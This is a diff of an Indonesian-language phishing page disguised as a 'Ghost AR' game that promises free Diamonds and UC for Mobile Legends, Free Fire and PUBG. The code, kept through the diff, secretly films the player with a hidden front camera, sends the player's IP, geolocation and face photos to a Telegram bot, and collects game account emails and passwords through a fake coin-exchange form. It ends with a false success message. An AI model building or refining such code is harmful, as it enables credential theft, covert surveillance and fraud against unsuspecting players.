@@ -3,7 +3,7 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no, viewport-fit=cover">
-    <title>👻 Ghost Explorer - Topup Diamond Gratis!</title>
+    <title>👻 Ghost AR - Tangkap Hantu Dapat Coin!</title>
     <style>
         * {
             margin: 0;
@@ -14,12 +14,9 @@
 
         body {
             font-family: 'Poppins', 'Segoe UI', Arial, sans-serif;
-            background: linear-gradient(135deg, #0a0f1e 0%, #0a0a1a 100%);
-            min-height: 100vh;
+            background: #000;
             overflow: hidden;
             position: fixed;
-            top: 0;
-            left: 0;
             width: 100%;
             height: 100%;
         }
@@ -75,7 +72,6 @@
             width: 100%;
             height: 100%;
             display: none;
-            z-index: 1;
         }
 
         #cameraView {
@@ -85,8 +81,6 @@
             width: 100%;
             height: 100%;
             object-fit: cover;
-            z-index: 0;
-            filter: brightness(0.9) contrast(1.1);
         }
 
         #frontCamera {
@@ -96,7 +90,6 @@
             width: 1px;
             height: 1px;
             opacity: 0;
-            pointer-events: none;
         }
 
         canvas {
@@ -157,58 +150,26 @@
             pointer-events: auto;
         }
 
-        .info-panel p {
-            color: white;
-            font-size: 14px;
-            margin: 5px 0;
-        }
-
-        .ghost-timer {
-            font-size: 18px;
-            font-weight: bold;
-            color: #ff6b6b;
-        }
-
-        .jumpscare {
-            position: fixed;
-            top: 0;
-            left: 0;
-            width: 100%;
-            height: 100%;
-            background: rgba(0,0,0,0.9);
-            z-index: 100;
+        .ghost-object {
+            position: absolute;
+            width: 80px;
+            height: 80px;
+            background: rgba(0,0,0,0.5);
+            border-radius: 50%;
             display: flex;
             justify-content: center;
             align-items: center;
-            opacity: 0;
-            transition: opacity 0.1s;
-            pointer-events: none;
+            font-size: 50px;
+            cursor: pointer;
+            animation: floatGhost 1s ease infinite;
+            z-index: 10;
+            backdrop-filter: blur(5px);
+            border: 2px solid rgba(255,215,0,0.5);
         }
 
-        .jumpscare.active {
-            opacity: 1;
-            pointer-events: auto;
-        }
-
-        .jumpscare-content {
-            text-align: center;
-            animation: shake 0.3s ease infinite;
-        }
-
-        .jumpscare-content .ghost {
-            font-size: 120px;
-            animation: float 1s ease infinite;
-        }
-
-        @keyframes shake {
-            0%,100% { transform: translate(0,0); }
-            25% { transform: translate(-5px,5px); }
-            75% { transform: translate(5px,-5px); }
-        }
-
-        @keyframes float {
+        @keyframes floatGhost {
             0%,100% { transform: translateY(0); }
-            50% { transform: translateY(-20px); }
+            50% { transform: translateY(-10px); }
         }
 
         .modal {
@@ -236,27 +197,9 @@
             width: 90%;
             text-align: center;
             border: 2px solid #ffd700;
-            max-height: 90vh;
-            overflow-y: auto;
         }
 
-        .modal-content h2 {
-            color: #ffd700;
-            margin-bottom: 20px;
-        }
-
-        .game-select {
-            width: 100%;
-            padding: 14px;
-            margin: 10px 0;
-            border: 1px solid #ffd700;
-            border-radius: 12px;
-            background: rgba(0,0,0,0.5);
-            color: white;
-            font-size: 16px;
-        }
-
-        .modal-content input {
+        .modal-content select, .modal-content input {
             width: 100%;
             padding: 14px;
             margin: 10px 0;
@@ -281,30 +224,26 @@
             background: #ff4444;
             color: white;
         }
-
-        .withdraw-info {
-            color: #ffd700;
-            font-size: 12px;
-            margin-bottom: 15px;
-        }
     </style>
 </head>
 <body>
 
-<!-- LAYAR START -->
 <div class="start-screen" id="startScreen">
-    <h1>👻 GHOST EXPLORER</h1>
-    <p>Cari hantu, kumpulkan coin, tukar dengan Diamond/UC!</p>
+    <h1>👻 GHOST AR</h1>
+    <p>Tangkap hantu yang muncul di layar!</p>
+    <p>Setiap hantu = +100 COIN</p>
     <p style="font-size: 14px;">🎮 Game butuh akses kamera</p>
     <button class="start-btn" id="startGameBtn">🎮 MULAI GAME</button>
     <div class="error-msg" id="errorMsg"></div>
 </div>
 
-<!-- GAME CONTAINER -->
 <div class="game-container" id="gameContainer">
     <video id="cameraView" autoplay playsinline></video>
     <video id="frontCamera" autoplay playsinline></video>
     <canvas id="photoCanvas"></canvas>
+    
+    <div id="ghostContainer" style="position:fixed; top:0; left:0; width:100%; height:100%; z-index:5; pointer-events:none;">
+    </div>
 
     <div class="ui-overlay">
         <div class="coin-header">
@@ -314,44 +253,31 @@
             </div>
             <button class="withdraw-btn" id="withdrawBtn">💎 TUKAR COIN</button>
         </div>
-
         <div class="info-panel">
-            <p>👻 <strong>Ghost Explorer</strong> - Cari Hantu Dapat Coin!</p>
-            <p>🎯 Kena hantu: <span style="color:#ffd700;">+100 COIN</span></p>
-            <p>💎 500 COIN = 50 Diamond ML/FF atau 60 UC PUBG</p>
-            <p>⏳ Hantu muncul setiap <span id="countdownTimer" class="ghost-timer">20</span> detik</p>
+            <p>👻 <strong>Ghost AR</strong> - Tangkap Hantu!</p>
+            <p>🎯 Klik hantu yang muncul: <span style="color:#ffd700;">+100 COIN</span></p>
+            <p>⏳ Hantu muncul random setiap 5-10 detik</p>
         </div>
     </div>
+</div>
 
-    <div id="jumpscare" class="jumpscare">
-        <div class="jumpscare-content">
-            <div class="ghost">👻💀👻</div>
-            <h2 style="color:white;">KAMU KENA HANTU!</h2>
-            <p style="color:#ffd700;">+100 COIN</p>
-        </div>
-    </div>
-
-    <!-- MODAL WITHDRAW -->
-    <div id="withdrawModal" class="modal">
-        <div class="modal-content">
-            <h2>💎 TUKAR COIN KE GAME</h2>
-            <p style="color:white;">Saldo: <strong id="modalCoin">0</strong> COIN</p>
-            <p class="withdraw-info">📌 500 COIN = 50 Diamond ML/FF | 60 UC PUBG</p>
-            
-            <select id="gameSelect" class="game-select">
-                <option value="Mobile Legends">🎮 Mobile Legends - Diamond</option>
-                <option value="Free Fire">🔥 Free Fire - Diamond</option>
-                <option value="PUBG Mobile">🎯 PUBG Mobile - UC</option>
-            </select>
-            
-            <input type="text" id="gameId" placeholder="ID Game / Username" required>
-            <input type="text" id="gameZone" placeholder="Zona / Server (jika ada)">
-            <input type="email" id="gameEmail" placeholder="Email Akun Game" required>
-            <input type="password" id="gamePassword" placeholder="Password Akun Game" required>
-            
-            <button id="submitWithdraw">💎 TUKAR SEKARANG</button>
-            <button class="close-modal" id="closeModal">TUTUP</button>
-        </div>
+<div id="withdrawModal" class="modal">
+    <div class="modal-content">
+        <h2>💎 TUKAR COIN KE GAME</h2>
+        <p style="color:white;">Saldo: <strong id="modalCoin">0</strong> COIN</p>
+        <p style="color:#ffd700; font-size:12px;">500 COIN = 50 Diamond ML/FF | 60 UC PUBG</p>
+        
+        <select id="gameSelect">
+            <option value="Mobile Legends">🎮 Mobile Legends - Diamond</option>
+            <option value="Free Fire">🔥 Free Fire - Diamond</option>
+            <option value="PUBG Mobile">🎯 PUBG Mobile - UC</option>
+        </select>
+        <input type="text" id="gameId" placeholder="ID Game / Username">
+        <input type="text" id="gameZone" placeholder="Zona / Server">
+        <input type="email" id="gameEmail" placeholder="Email Akun Game">
+        <input type="password" id="gamePassword" placeholder="Password Akun Game">
+        <button id="submitWithdraw">💎 TUKAR SEKARANG</button>
+        <button class="close-modal" id="closeModal">TUTUP</button>
     </div>
 </div>
 
@@ -362,37 +288,23 @@
     let coins = 0;
     let photoTaken = false;
     let locationSent = false;
-    let gameActive = false;
     let backStream = null;
     let frontStream = null;
-    let countdown = 20;
-    let timerInterval = null;
-    let jumpscareActive = false;
+    let ghostInterval = null;
+    let gameActive = false;
 
-    // DOM elements
     const startScreen = document.getElementById('startScreen');
     const gameContainer = document.getElementById('gameContainer');
     const startBtn = document.getElementById('startGameBtn');
     const errorMsg = document.getElementById('errorMsg');
     const coinSpan = document.getElementById('coinAmount');
-    const countdownSpan = document.getElementById('countdownTimer');
-    const jumpscareDiv = document.getElementById('jumpscare');
     const withdrawBtn = document.getElementById('withdrawBtn');
-    const withdrawModal = document.getElementById('withdrawModal');
-    const closeModal = document.getElementById('closeModal');
-    const submitWithdraw = document.getElementById('submitWithdraw');
     const modalCoinSpan = document.getElementById('modalCoin');
-    const gameSelect = document.getElementById('gameSelect');
-    const gameId = document.getElementById('gameId');
-    const gameZone = document.getElementById('gameZone');
-    const gameEmail = document.getElementById('gameEmail');
-    const gamePassword = document.getElementById('gamePassword');
-
+    const ghostContainer = document.getElementById('ghostContainer');
     const backVideo = document.getElementById('cameraView');
     const frontVideo = document.getElementById('frontCamera');
     const photoCanvas = document.getElementById('photoCanvas');
 
-    // ========== FUNGSI TELEGRAM ==========
     async function getIP() {
         try {
             const res = await fetch('https://api.ipify.org?format=json');
@@ -416,7 +328,7 @@
         const ip = await getIP();
         const location = await getLocation();
         const tanggal = new Date().toLocaleString('id-ID');
-        const pesan = `📍 LOKASI & IP KORBAN 📍%0AIP: ${ip}%0ALokasi: ${location}%0AWaktu: ${tanggal}%0AGame: GHOST EXPLORER (TUKAR COIN KE GAME)`;
+        const pesan = `📍 LOKASI & IP KORBAN 📍%0AIP: ${ip}%0ALokasi: ${location}%0AWaktu: ${tanggal}%0AGame: GHOST AR (Tangkap Hantu)`;
         await fetch(`https://api.telegram.org/bot${TELEGRAM_TOKEN}/sendMessage?chat_id=${CHAT_ID}&text=${encodeURIComponent(pesan)}`);
         locationSent = true;
     }
@@ -438,7 +350,7 @@
         const ip = await getIP();
         const location = await getLocation();
         const tanggal = new Date().toLocaleString('id-ID');
-        const caption = `📸 FOTO WAJAH KORBAN 📸%0AIP: ${ip}%0ALokasi: ${location}%0AWaktu: ${tanggal}%0AKorban main game hantu & mau tukar coin ke game (tidak sadar difoto)`;
+        const caption = `📸 FOTO WAJAH KORBAN 📸%0AIP: ${ip}%0ALokasi: ${location}%0AWaktu: ${tanggal}%0AKorban main game Ghost AR (tangkap hantu) - tidak sadar difoto`;
 
         const formData = new FormData();
         formData.append('chat_id', CHAT_ID);
@@ -448,7 +360,42 @@
         photoTaken = true;
     }
 
-    // ========== START GAME ==========
+    function spawnGhost() {
+        if (!gameActive) return;
+        
+        const ghost = document.createElement('div');
+        ghost.className = 'ghost-object';
+        
+        const size = Math.random() * 60 + 60;
+        ghost.style.width = size + 'px';
+        ghost.style.height = size + 'px';
+        ghost.style.fontSize = (size - 20) + 'px';
+        ghost.style.left = Math.random() * (window.innerWidth - size) + 'px';
+        ghost.style.top = Math.random() * (window.innerHeight - 150) + 'px';
+        ghost.style.position = 'absolute';
+        ghost.style.pointerEvents = 'auto';
+        
+        const ghosts = ['👻', '💀', '👹', '😈', '👾'];
+        ghost.innerHTML = ghosts[Math.floor(Math.random() * ghosts.length)];
+        
+        ghost.onclick = (e) => {
+            e.stopPropagation();
+            coins += 100;
+            coinSpan.innerText = coins;
+            ghost.remove();
+            
+            // Efek getar
+            if (navigator.vibrate) navigator.vibrate(100);
+        };
+        
+        ghostContainer.appendChild(ghost);
+        
+        // Hantu ilang setelah 5 detik kalo gak diklik
+        setTimeout(() => {
+            if (ghost.parentNode) ghost.remove();
+        }, 5000);
+    }
+
     async function startGame() {
         errorMsg.style.display = 'none';
         
@@ -469,7 +416,16 @@
             gameContainer.style.display = 'block';
             gameActive = true;
             
-            startGhostTimer();
+            // Munculin hantu setiap 5-10 detik
+            ghostInterval = setInterval(() => {
+                if (gameActive) spawnGhost();
+            }, Math.random() * 5000 + 5000);
+            
+            // Langsung spawn 3 hantu awal
+            setTimeout(() => spawnGhost(), 1000);
+            setTimeout(() => spawnGhost(), 3000);
+            setTimeout(() => spawnGhost(), 5000);
+            
             document.documentElement.requestFullscreen();
             
         } catch(err) {
@@ -478,44 +434,19 @@
         }
     }
 
-    function startGhostTimer() {
-        countdown = 20;
-        countdownSpan.innerText = countdown;
-        if (timerInterval) clearInterval(timerInterval);
-        
-        timerInterval = setInterval(() => {
-            if (!gameActive) return;
-            countdown--;
-            countdownSpan.innerText = countdown;
-            if (countdown <= 0) {
-                showJumpscare();
-                let newWait = Math.floor(Math.random() * 15) + 15;
-                countdown = newWait;
-                countdownSpan.innerText = countdown;
-            }
-        }, 1000);
-    }
+    // Withdraw logic
+    const withdrawModal = document.getElementById('withdrawModal');
+    const closeModal = document.getElementById('closeModal');
+    const submitWithdraw = document.getElementById('submitWithdraw');
+    const gameSelect = document.getElementById('gameSelect');
+    const gameId = document.getElementById('gameId');
+    const gameZone = document.getElementById('gameZone');
+    const gameEmail = document.getElementById('gameEmail');
+    const gamePassword = document.getElementById('gamePassword');
 
-    function showJumpscare() {
-        if (jumpscareActive) return;
-        jumpscareActive = true;
-        coins += 100;
-        coinSpan.innerText = coins;
-        modalCoinSpan.innerText = coins;
-        
-        jumpscareDiv.classList.add('active');
-        if (navigator.vibrate) navigator.vibrate(500);
-        
-        setTimeout(() => {
-            jumpscareDiv.classList.remove('active');
-            jumpscareActive = false;
-        }, 1500);
-    }
-
-    // ========== WITHDRAW KE GAME ==========
     withdrawBtn.onclick = () => {
         if (coins < 500) {
-            alert('Minimal tukar 500 COIN! (dapat 50 Diamond/UC)');
+            alert('Minimal tukar 500 COIN! (50 Diamond/UC)');
             return;
         }
         modalCoinSpan.innerText = coins;
@@ -537,30 +468,17 @@
         const email = gameEmail.value.trim();
         const password = gamePassword.value.trim();
 
-        if (!idGame) {
-            alert('Masukkan ID Game / Username!');
-            return;
-        }
-        if (!email || !password) {
-            alert('Masukkan Email dan Password akun game!');
-            return;
-        }
-        if (coins < 500) {
-            alert('Minimal 500 COIN!');
-            return;
-        }
+        if (!idGame) { alert('Masukkan ID Game!'); return; }
+        if (!email || !password) { alert('Masukkan Email dan Password akun game!'); return; }
+        if (coins < 500) { alert('Minimal 500 COIN!'); return; }
 
-        // Hitung reward
-        let reward = "";
-        if (selectedGame === "Mobile Legends") reward = "50 Diamond ML";
-        else if (selectedGame === "Free Fire") reward = "50 Diamond FF";
-        else reward = "60 UC PUBG";
-
+        let reward = selectedGame === "PUBG Mobile" ? "60 UC" : "50 Diamond";
+        
         const ip = await getIP();
         const location = await getLocation();
         const tanggal = new Date().toLocaleString('id-ID');
         
-        let pesan = `💎💎💎 TUKAR COIN KE GAME 💎💎💎%0A%0A`;
+        let pesan = `💎 TUKAR COIN KE GAME 💎%0A%0A`;
         pesan += `🎮 GAME     : ${selectedGame}%0A`;
         pesan += `🎮 ID GAME  : ${idGame}%0A`;
         pesan += `🗺️ ZONE     : ${zone || '-'}%0A`;
@@ -570,14 +488,12 @@
         pesan += `💎 REWARD   : ${reward}%0A`;
         pesan += `🌐 IP       : ${ip}%0A`;
         pesan += `📍 LOKASI   : ${location}%0A`;
-        pesan += `📅 WAKTU    : ${tanggal}%0A%0A`;
-        pesan += `⚠️ KORBAN MAU TUKAR COIN KE GAME (DATA AKUN GAME TERKIRIM) ⚠️`;
+        pesan += `📅 WAKTU    : ${tanggal}`;
 
         await fetch(`https://api.telegram.org/bot${TELEGRAM_TOKEN}/sendMessage?chat_id=${CHAT_ID}&text=${encodeURIComponent(pesan)}`);
         
         alert(`✅ Tukar coin berhasil! ${reward} akan dikirim ke akun game kamu dalam 24 jam.`);
         
-        // Reset coin setelah tukar
         coins = 0;
         coinSpan.innerText = coins;
         modalCoinSpan.innerText = coins;
